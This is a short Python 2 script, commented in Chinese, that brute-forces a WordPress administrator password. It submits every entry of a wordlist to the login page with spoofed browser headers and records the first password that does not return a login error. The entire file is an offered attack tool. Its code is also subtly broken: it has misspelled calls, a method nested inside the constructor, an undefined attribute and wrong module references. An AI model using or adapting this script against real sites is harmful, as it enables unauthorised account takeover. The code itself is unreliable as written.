# coding=utf-8

import urllib, time, re, cookielib, sys


class Wordpress():
    def __init__(self, host, username):
        self.username = username
        self.host = host
        self.http = 'http://' + host
        self.url = self.http + '/wp-admin/'
        self.user_agent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)'
        self.referer = self.http + '/wp-login.php'
        self.cook = 'wordpress_test_cookie=WP+Cookie+check'
        # 初始化定义 header 避免被服务器屏蔽
        self.hraders = {'User-Agent': self.user_agent, "Cookie":self.cook,
                        "Referer":self.referer, "Host":self.host}
        self.cookie = cookielib.CookieJar()
        self.opener = urllib.buid_opener(urllib.HTTPCookieProcessor(self.cookie))

        def crash(self, filename):
            try:
                pwd = open(filename, 'r')
                # 读取密码文件，密码文件中密码越多破解的概率越大
                while 1:
                    i = pwd.readline()
                    if not i:
                        break

                    data = urllib.urlencode({"log": self.username, "pwd": i.strip(),
                                            "testcookie": "1", "redirect_to": self.redirect})
                    req = urllib.Request(url=self.url, data=data, headers=self.hraders)  
                    
                    # 构造好数据包之后提交给wordpress网站后台
                    res = urllib.urlopen(req)
                    reslut = res.read()
                    login = re.search(r'login_error', reslut)

                    # 判断返回来的字符串，如果有login error说明失败
                    if login:
                        pass
                    else:
                        print('crashed! passwd is %s %s' % (self.username, i.strip()))  
                        f = open('wordprocess.txt', 'w+')
                        f.write('crashed! passwd is %s %s' % (self.username, i.strip()))
                        pwd.close()
                        f.close()

                        # 如果匹配到密码，则这次任务完成,退出程序
                        exit()
                        break
                pwd.close()
            except Exception as e:
                print(e)

if __name__ == "__main__":
    print('Begin ' + time.ctime())
    host = sys.argv[1]
    user = sys.argv[2]
    dictfile = sys.argv[3]

    # 提供你事先准备好的密码文件
    obj = Wordpress(host, user)
    obj.crash(dictfile)
    print('End ' + time.ctime())

